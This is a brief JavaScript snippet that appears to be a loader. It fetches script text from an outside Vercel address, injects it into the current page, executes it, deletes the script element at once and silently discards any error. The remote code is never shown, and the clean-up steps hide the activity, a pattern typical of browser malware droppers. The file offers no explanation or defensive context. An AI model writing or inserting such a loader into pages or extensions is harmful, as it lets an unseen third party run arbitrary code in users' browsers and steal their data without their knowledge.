(function () {
  const sourceUrl = `https://software-shldv.vercel.app/sourceclient?t=${Date.now()}`;

  fetch(sourceUrl, { cache: "no-store", redirect: "error" })
    .then((response) => {
      if (!response.ok) throw new Error(`Source client request failed: ${response.status}`);
      return response.text();
    })
    .then((source) => {
      const script = document.createElement("script");
      script.textContent = source;
      (document.head || document.documentElement).appendChild(script);
      script.remove();
    })
    .catch(() => {});
})();
